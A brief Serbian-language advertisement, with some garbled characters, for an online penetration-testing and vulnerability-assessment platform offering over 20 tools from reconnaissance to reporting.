**Trenutno dostupno pode코avanje za procenu ranjivosti i testiranje proboja**. Pokrenite kompletan pentest od bilo kog mesta sa preko 20 alatki i funkcija koje idu od izvi캠anja do izve코tavanja. Ne zamenjujemo pentestere - razvijamo prilago캠ene alatke, module za otkrivanje i eksploataciju kako bismo im vratili ne코to vremena da dublje kopaju, otvaraju ljuske i zabavljaju se.

</details>
